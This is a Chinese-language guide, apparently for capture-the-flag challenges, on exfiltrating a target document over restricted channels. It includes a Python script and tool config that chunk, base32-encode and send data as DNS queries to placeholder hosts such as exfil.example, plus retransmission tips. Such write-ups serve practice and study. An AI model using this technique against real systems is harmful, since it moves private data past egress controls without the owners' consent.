# 数据外带：一次只能带一点点

出站被管控、但某个协议还通的时候，题面通常长这样：
「把目标文档完整外带，完成后校验」。形状永远是同一套：

```
取数据 → 切块 → 编码 → 带上序号和总数 → 复用会话 → 最后一跳确认
```

## 0. 先看通道的形状

| 题目给的 | 单块容量 | 编码 |
|---|---|---|
| `<seq>-<total>-<b32>.exfil.example` | DNS label ≤ 63 字符 | base32（无 `=`） |
| `/api/push?d=<b64>` | URL 长度 | base64url |
| `X-Data: <hex>` | 头部长度 | hex |
| ICMP payload | ~1400 字节 | raw |

**base32 是 DNS 通道的默认选择**：大小写不敏感、字母表在 label 允许范围内。
`base64` 里的 `+ / =` 在 DNS 里会坏，必须换 `- _` 并去掉填充。

## 1. 用工具一次做完

```json
{"source":"http://target/target-data",
 "endpoint":"http://target/dns",
 "template":"{seq}-{total}-{chunk}.exfil.challenge.local",
 "encoding":"base32","chunk_size":32,
 "finish":"GET http://target/retrieve?session={session}"}
```

它会：取数据（自动从 JSON 的 `content`/`data` 字段里解一层）→ 切块 → 编码 →
逐块发送 → 第一块的响应里抓 `session` → 后续块带上 → 最后 `finish` 取回结果。

## 2. 手工版要注意的四个细节

```python
import base64, requests
data = requests.get(B+"/target-data").json()["content"].encode()
CH = 32                                  # ① 块大小：先算 (63 - 前缀长度) * 5 // 8
chunks = [data[i:i+CH] for i in range(0, len(data), CH)]
total = len(chunks)                      # ② 总数从第一块起就必须是最终值，不能边发边长
sess = None
for i, c in enumerate(chunks):
    b32 = base64.b32encode(c).decode().rstrip("=")   # ③ 去掉 = 填充
    body = {"query": f"{i}-{total}-{b32}.exfil.example"}   # ④ seq 从 0 开始
    if sess: body["session"] = sess
    r = requests.post(B+"/dns", json=body).json()
    sess = r.get("session", sess)
print(requests.get(f"{B}/retrieve?session={sess}").text)
```

1. **块大小**：DNS label 上限 63 字节，`<seq>-<total>-` 前缀还要占位。
   32 字节原文 → base32 后 52 字符，加上 `28-29-` 刚好卡进 63。
2. **总数**：第一块就要报最终总数。如果通道要求「边发边长」，那它的块尾一定有结束标记（见 §3）。
3. **填充**：`=` 在 DNS 里非法，务必 `rstrip("=")`；解码端要能容忍缺填充。
4. **序号从 0 开始**（大多数实现如此，收到 `seq must start at 0` 就换 1 起）。

## 3. 变体：按行、按记录、带结束标记

有些通道不用「序号+总数」，而是：

```python
for line in data.splitlines():
    post({"line": base64.b64encode(line).decode()})
post({"eof": True})            # 显式结束标记
```

判断依据就是题面给的 `notes` / `format` 字段 —— **照抄它给的形状**，别自创。

## 4. 校验与重传

- 收尾接口常返回 `{"complete": true, "assembled_size": N}`：**先比 size**，再比内容 hash。
- 少块时不要整段重发：只补缺失的 `seq`（`{"received_chunks": 21, "total": 29}` 这种回显就是在提示你）。
- 返回 `assembled_size` 比原文小时，多半是 **base32 填充被吃了** 或 **chunk_size 超过 label 上限被截断**。

## 5. 常见坑

- 数据里有换行/二进制：**先按字节切**，不要按行切（除非通道就是按行的）。
- 通道有速率限制：一块一块发，别并发；失败重试 2 次即可。
- 会话 id 常在**第一块**的响应里出现，别漏读。
- 校验通过后 flag 往往就在 `retrieve` 的响应体里，记得把响应体整体过一遍匹配（别只看结构化的字段）。
